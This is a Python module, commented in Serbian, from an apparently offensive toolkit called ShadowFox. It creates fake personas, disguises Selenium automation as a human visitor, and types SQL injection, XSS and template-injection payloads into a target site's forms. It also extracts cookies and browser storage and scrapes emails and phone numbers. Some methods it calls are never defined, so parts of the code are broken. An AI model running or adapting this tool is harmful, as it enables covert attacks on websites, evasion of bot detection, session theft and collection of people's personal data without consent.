# shadowfox/agents/ghost_threads.py

import random
import time
import json
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from faker import Faker
import string
from typing import Dict, List, Any, Optional
import logging
from datetime import datetime, timedelta
import threading
import queue

class ShadowPersona:
    """
    Klasa koja reprezentuje jednu lažnu AI ličnost
    Sa realnim ponašanjem i prikrivenim anomalijama
    """
    
    def __init__(self, persona_id: str = None):
        self.fake = Faker()
        self.persona_id = persona_id or self._generate_persona_id()
        
        # Osnovni profil
        self.profile = self._generate_profile()
        
        # Behavioral patterns
        self.behavior = self._generate_behavior_pattern()
        
        # Shadow attributes (prikrivene anomalije)
        self.shadow_attributes = self._generate_shadow_attributes()
        
        # Session tracking
        self.session_data = {}
        self.action_history = []
        
    def _generate_persona_id(self) -> str:
        """Generiše jedinstveni ID za personu"""
        return f"shadow_{random.randint(100000, 999999)}_{int(time.time())}"
    
    def _generate_profile(self) -> Dict:
        """Generiše realistični profil korisnika"""
        return {
            "first_name": self.fake.first_name(),
            "last_name": self.fake.last_name(),
            "email": self.fake.email(),
            "username": self._generate_username(),
            "age": random.randint(18, 65),
            "country": self.fake.country(),
            "phone": self.fake.phone_number(),
            "job": self.fake.job(),
            "bio": self.fake.text(max_nb_chars=200),
            "interests": random.sample([
                "technology", "music", "sports", "travel", "food", 
                "books", "movies", "gaming", "fitness", "photography"
            ], random.randint(2, 5))
        }
    
    def _generate_username(self) -> str:
        """Generiše realistično korisničko ime"""
        patterns = [
            f"{self.profile.get('first_name', self.fake.first_name()).lower()}{random.randint(1, 999)}",
            f"{self.fake.user_name()}{random.randint(10, 99)}",
            f"{self.fake.word()}{self.fake.word()}{random.randint(1, 99)}"
        ]
        return random.choice(patterns)
    
    def _generate_behavior_pattern(self) -> Dict:
        """Generiše pattern ponašanja korisnika"""
        return {
            "typing_speed": random.uniform(0.05, 0.3),  # sekunde između kucanja
            "mouse_precision": random.uniform(0.7, 0.95),  # preciznost klika
            "pause_frequency": random.uniform(0.1, 0.4),  # koliko često pravi pauze
            "scroll_pattern": random.choice(["smooth", "jumpy", "fast"]),
            "attention_span": random.randint(30, 300),  # sekunde fokusa
            "error_rate": random.uniform(0.02, 0.15),  # verovatnoća greške
            "browser_habits": {
                "opens_new_tabs": random.choice([True, False]),
                "uses_bookmarks": random.choice([True, False]),
                "clears_history": random.choice([True, False])
            },
            "active_hours": [
                random.randint(6, 10),  # jutro
                random.randint(18, 23)  # veče
            ]
        }
    
    def _generate_shadow_attributes(self) -> Dict:
        """Generiše prikrivene anomalije za stealth eksploataciju"""
        return {
            "fingerprint_spoofing": {
                "user_agent_rotation": True,
                "canvas_fingerprint": self._generate_fake_canvas(),
                "webgl_fingerprint": self._generate_fake_webgl(),
                "timezone_spoofing": random.choice([
                    "America/New_York", "Europe/London", "Asia/Tokyo", "Australia/Sydney"
                ])
            },
            "network_behavior": {
                "request_timing": random.uniform(0.5, 3.0),
                "connection_persistence": random.choice([True, False]),
                "dns_over_https": random.choice([True, False])
            },
            "stealth_payloads": {
                "inject_in_forms": True,
                "modify_requests": True,
                "extract_tokens": True,
                "session_hijacking": True
            },
            "osint_collection": {
                "scrape_user_data": True,
                "map_relationships": True,
                "collect_metadata": True,
                "track_patterns": True
            }
        }
    
    def _generate_fake_canvas(self) -> str:
        """Generiše lažni canvas fingerprint"""
        return ''.join(random.choices(string.hexdigits.lower(), k=32))
    
    def _generate_fake_webgl(self) -> str:
        """Generiše lažni WebGL fingerprint"""
        return ''.join(random.choices(string.hexdigits.lower(), k=24))

class GhostThreadsEngine:
    """
    Glavni engine koji upravlja multiple ShadowPersona instancama
    i koordinira njihove stealth aktivnosti
    """
    
    def __init__(self, operator, max_personas: int = 5):
        self.operator = operator
        self.max_personas = max_personas
        self.logger = logging.getLogger('GhostThreadsEngine')
        
        # Aktivne persone
        self.active_personas = {}
        self.persona_queue = queue.Queue()
        
        # Selenium setup
        self.chrome_options = self._setup_chrome_options()
        
        # Thread control
        self.thread_pool = []
        self.running = False
        
        # Stealth settings
        self.stealth_config = {
            "min_action_delay": 1.0,
            "max_action_delay": 5.0,
            "user_agent_rotation": True,
            "proxy_rotation": False,  # Dodati proxy listu po potrebi
            "behavioral_randomization": True
        }
    
    def _setup_chrome_options(self) -> Options:
        """Setup Chrome opcije za stealth browsing"""
        options = Options()
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-plugins")
        options.add_argument("--disable-images")  # Brže učitavanje
        
        # Random window size
        width = random.randint(1024, 1920)
        height = random.randint(768, 1080)
        options.add_argument(f"--window-size={width},{height}")
        
        return options
    
    def create_persona(self) -> ShadowPersona:
        """Kreira novu ShadowPersona instancu"""
        persona = ShadowPersona()
        self.active_personas[persona.persona_id] = persona
        
        self.logger.info(f"Kreirana nova persona: {persona.persona_id} ({persona.profile['first_name']} {persona.profile['last_name']})")
        
        # Log u operator
        self.operator.log_agent_action("GhostThreadsEngine", "persona_created", {
            "persona_id": persona.persona_id,
            "profile": persona.profile,
            "behavior_type": persona.behavior["scroll_pattern"]
        })
        
        return persona
    
    def start_ghost_session(self, target_url: str, mission_id: str, 
                          attack_objectives: List[str]) -> Dict:
        """
        Pokreće ghost session sa ShadowPersona aktivnostima
        """
        self.operator.current_mission_id = mission_id
        
        session_results = {
            "session_id": f"ghost_{int(time.time())}",
            "target_url": target_url,
            "personas_deployed": [],
            "stealth_activities": [],
            "data_collected": {},
            "anomalies_injected": [],
            "osint_extracted": {}
        }
        
        # Kreiraj persone za session
        num_personas = random.randint(1, min(self.max_personas, 3))
        
        for i in range(num_personas):
            persona = self.create_persona()
            session_results["personas_deployed"].append(persona.persona_id)
            
            # Pokreni thread za svaku personu
            thread = threading.Thread(
                target=self._run_persona_session,
                args=(persona, target_url, attack_objectives, session_results)
            )
            thread.daemon = True
            thread.start()
            self.thread_pool.append(thread)
        
        return session_results
    
    def _run_persona_session(self, persona: ShadowPersona, target_url: str, 
                           objectives: List[str], session_results: Dict):
        """
        Pokreće pojedinačnu personu session
        """
        driver = None
        try:
            # Setup driver sa persona specifičnim settingsima
            driver = self._create_persona_driver(persona)
            
            # Simuliraj realno ponašanje
            self._simulate_human_navigation(driver, persona, target_url)
            
            # Izvršava stealth objectives
            for objective in objectives:
                self._execute_stealth_objective(driver, persona, objective, session_results)
                
                # Random pauza između aktivnosti
                time.sleep(random.uniform(2, 8))
            
            # OSINT collection
            osint_data = self._collect_osint_data(driver, persona, target_url)
            session_results["osint_extracted"][persona.persona_id] = osint_data
            
        except Exception as e:
            self.logger.error(f"Greška u persona session {persona.persona_id}: {e}")
            
        finally:
            if driver:
                driver.quit()
    
    def _create_persona_driver(self, persona: ShadowPersona) -> webdriver.Chrome:
        """Kreira Chrome driver sa persona specifičnim settingsima"""
        options = self.chrome_options
        
        # Persona specifični User-Agent
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        options.add_argument(f"--user-agent={random.choice(user_agents)}")
        
        driver = webdriver.Chrome(options=options)
        
        # Inject stealth scripts
        driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
            'source': '''
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined,
                });
            '''
        })
        
        return driver
    
    def _simulate_human_navigation(self, driver: webdriver.Chrome, 
                                 persona: ShadowPersona, target_url: str):
        """Simulira ljudsko ponašanje pri navigaciji"""
        try:
            driver.get(target_url)
            
            # Random scroll ponašanje
            scroll_pattern = persona.behavior["scroll_pattern"]
            
            if scroll_pattern == "smooth":
                self._smooth_scroll(driver)
            elif scroll_pattern == "jumpy":
                self._jumpy_scroll(driver)
            else:
                self._fast_scroll(driver)
            
            # Random mouse movements
            self._simulate_mouse_movements(driver, persona)
            
            # Pauza kao da korisnik čita
            reading_time = random.uniform(5, 15)
            time.sleep(reading_time)
            
        except Exception as e:
            self.logger.error(f"Greška u simulaciji navigacije: {e}")
    
    def _smooth_scroll(self, driver: webdriver.Chrome):
        """Smooth scrolling pattern"""
        for i in range(random.randint(3, 8)):
            driver.execute_script(f"window.scrollBy(0, {random.randint(100, 300)});")
            time.sleep(random.uniform(0.5, 2.0))
    
    def _jumpy_scroll(self, driver: webdriver.Chrome):
        """Jumpy scrolling pattern"""
        for i in range(random.randint(2, 5)):
            driver.execute_script(f"window.scrollBy(0, {random.randint(200, 600)});")
            time.sleep(random.uniform(0.2, 1.0))
    
    def _fast_scroll(self, driver: webdriver.Chrome):
        """Fast scrolling pattern"""
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(random.uniform(1.0, 3.0))
    
    def _simulate_mouse_movements(self, driver: webdriver.Chrome, persona: ShadowPersona):
        """Simulira random mouse pokrete"""
        try:
            actions = ActionChains(driver)
            
            # Random mouse movements
            for _ in range(random.randint(2, 5)):
                x_offset = random.randint(-200, 200)
                y_offset = random.randint(-100, 100)
                actions.move_by_offset(x_offset, y_offset)
                actions.pause(random.uniform(0.1, 0.5))
            
            actions.perform()
            
        except Exception as e:
            self.logger.error(f"Greška u mouse simulaciji: {e}")
    
    def _execute_stealth_objective(self, driver: webdriver.Chrome, 
                                 persona: ShadowPersona, objective: str, 
                                 session_results: Dict):
        """Izvršava stealth cilj sa prikrivenim anomalijama"""
        
        if objective == "form_injection":
            self._stealth_form_injection(driver, persona, session_results)
        elif objective == "session_extraction":
            self._extract_session_data(driver, persona, session_results)
        elif objective == "token_harvesting":
            self._harvest_tokens(driver, persona, session_results)
        elif objective == "behavioral_mapping":
            self._map_user_behavior(driver, persona, session_results)
        elif objective == "stealth_reconnaissance":
            self._stealth_recon(driver, persona, session_results)
    
    def _stealth_form_injection(self, driver: webdriver.Chrome, 
                              persona: ShadowPersona, session_results: Dict):
        """Injektuje anomalije u forme uz ljudsko ponašanje"""
        try:
            forms = driver.find_elements(By.TAG_NAME, "form")
            
            for form in forms[:2]:  # Max 2 forme po sessioni
                inputs = form.find_elements(By.TAG_NAME, "input")
                
                for input_field in inputs:
                    input_type = input_field.get_attribute("type")
                    
                    if input_type in ["text", "email", "search"]:
                        # Simuliraj ljudsko kucanje
                        self._human_type(input_field, persona, self._generate_stealth_payload(input_type))
                        
                        # Log anomaliju
                        session_results["anomalies_injected"].append({
                            "type": "form_injection",
                            "persona_id": persona.persona_id,
                            "field_type": input_type,
                            "timestamp": datetime.now().isoformat()
                        })
                        
        except Exception as e:
            self.logger.error(f"Greška u form injection: {e}")
    
    def _human_type(self, element, persona: ShadowPersona, text: str):
        """Simulira ljudsko kucanje sa greškama i pauzama"""
        element.click()
        time.sleep(random.uniform(0.1, 0.5))
        
        for char in text:
            element.send_keys(char)
            
            # Random pauze između karaktera
            typing_speed = persona.behavior["typing_speed"]
            time.sleep(random.uniform(typing_speed * 0.5, typing_speed * 1.5))
            
            # Random greške
            if random.random() < persona.behavior["error_rate"]:
                element.send_keys(Keys.BACKSPACE)
                time.sleep(random.uniform(0.1, 0.3))
    
    def _generate_stealth_payload(self, field_type: str) -> str:
        """Generiše stealth payload koji izgleda normalno"""
        stealth_payloads = {
            "text": [
                "john.doe@example.com'||'1'='1",  # SQL injection u email formatu
                "user<script>alert('xss')</script>name",  # XSS u user name
                "normal_text{{7*7}}test",  # Template injection
            ],
            "email": [
                "test@domain.com'+(SELECT version())+'",
                "user+<svg/onload=alert(1)>@test.com",
            ],
            "search": [
                "search term'||(SELECT user())||'",
                "normal search<img src=x onerror=alert(1)>",
            ]
        }
        
        payloads = stealth_payloads.get(field_type, ["normal_input"])
        return random.choice(payloads)
    
    def _extract_session_data(self, driver: webdriver.Chrome, 
                            persona: ShadowPersona, session_results: Dict):
        """Ekstraktuje session podatke"""
        try:
            # Cookies
            cookies = driver.get_cookies()
            
            # Local storage
            local_storage = driver.execute_script("return window.localStorage;")
            
            # Session storage
            session_storage = driver.execute_script("return window.sessionStorage;")
            
            extracted_data = {
                "cookies": cookies,
                "local_storage": local_storage,
                "session_storage": session_storage,
                "persona_id": persona.persona_id,
                "timestamp": datetime.now().isoformat()
            }
            
            session_results["stealth_activities"].append({
                "type": "session_extraction",
                "data": extracted_data
            })
            
        except Exception as e:
            self.logger.error(f"Greška u session extraction: {e}")
    
    def _collect_osint_data(self, driver: webdriver.Chrome, 
                          persona: ShadowPersona, target_url: str) -> Dict:
        """Prikuplja OSINT podatke tokom stealth session"""
        osint_data = {
            "persona_id": persona.persona_id,
            "target_url": target_url,
            "collected_at": datetime.now().isoformat(),
            "page_structure": {},
            "exposed_data": {},
            "social_links": [],
            "contact_info": [],
            "technology_stack": []
        }
        
        try:
            # Page structure
            osint_data["page_structure"] = {
                "title": driver.title,
                "meta_description": self._get_meta_content(driver, "description"),
                "meta_keywords": self._get_meta_content(driver, "keywords"),
                "h1_tags": [el.text for el in driver.find_elements(By.TAG_NAME, "h1")][:5],
                "external_links": self._extract_external_links(driver)[:10]
            }
            
            # Exposed emails and phones
            page_text = driver.find_element(By.TAG_NAME, "body").text
            osint_data["contact_info"] = self._extract_contact_info(page_text)
            
            # Social media links
            osint_data["social_links"] = self._extract_social_links(driver)
            
        except Exception as e:
            self.logger.error(f"Greška u OSINT collection: {e}")
        
        return osint_data
    
    def _get_meta_content(self, driver: webdriver.Chrome, name: str) -> str:
        """Izvlači meta tag content"""
        try:
            element = driver.find_element(By.XPATH, f"//meta[@name='{name}']")
            return element.get_attribute("content") or ""
        except:
            return ""
    
    def _extract_external_links(self, driver: webdriver.Chrome) -> List[str]:
        """Izvlači external linkove"""
        try:
            links = driver.find_elements(By.TAG_NAME, "a")
            external_links = []
            
            current_domain = driver.current_url.split('/')[2]
            
            for link in links:
                href = link.get_attribute("href")
                if href and current_domain not in href and href.startswith("http"):
                    external_links.append(href)
            
            return list(set(external_links))
        except:
            return []
    
    def _extract_contact_info(self, text: str) -> Dict:
        """Izvlači kontakt informacije iz teksta"""
        import re
        
        # Email regex
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        emails = re.findall(email_pattern, text)
        
        # Phone regex (basic)
        phone_pattern = r'[\+]?[1-9]?[0-9]{7,15}'
        phones = re.findall(phone_pattern, text)
        
        return {
            "emails": list(set(emails))[:5],
            "phones": list(set(phones))[:5]
        }
    
    def _extract_social_links(self, driver: webdriver.Chrome) -> List[str]:
        """Izvlači social media linkove"""
        social_patterns = [
            "facebook.com", "twitter.com", "linkedin.com", 
            "instagram.com", "youtube.com", "github.com"
        ]
        
        social_links = []
        try:
            links = driver.find_elements(By.TAG_NAME, "a")
            
            for link in links:
                href = link.get_attribute("href")
                if href:
                    for pattern in social_patterns:
                        if pattern in href:
                            social_links.append(href)
                            break
        except:
            pass
        
        return list(set(social_links))
    
    def stop_all_sessions(self):
        """Zaustavlja sve aktivne sessione"""
        self.running = False
        
        # Čeka da se svi threadovi završe
        for thread in self.thread_pool:
            thread.join(timeout=5)
        
        self.logger.info("Svi Ghost Thread sessioni su zaustavljeni")

# Test funkcionalnosti
if __name__ == "__main__":
    from operator import ShadowFoxOperator
    
    # Setup
    op = ShadowFoxOperator()
    ghost_engine = GhostThreadsEngine(op, max_personas=2)
    
    # Test kreiranje persone
    persona = ghost_engine.create_persona()
    print(f"Kreirana persona: {persona.profile['first_name']} {persona.profile['last_name']}")
    print(f"Shadow attributes: {persona.shadow_attributes['stealth_payloads']}")
    
    # Test session (komentarisano jer traži Chrome driver)
    # mission_id = op.create_mission("https://httpbin.org", "Ghost Threads test")
    # results = ghost_engine.start_ghost_session(
    #     "https://httpbin.org", 
    #     mission_id, 
    #     ["form_injection", "session_extraction", "stealth_reconnaissance"]
    # )
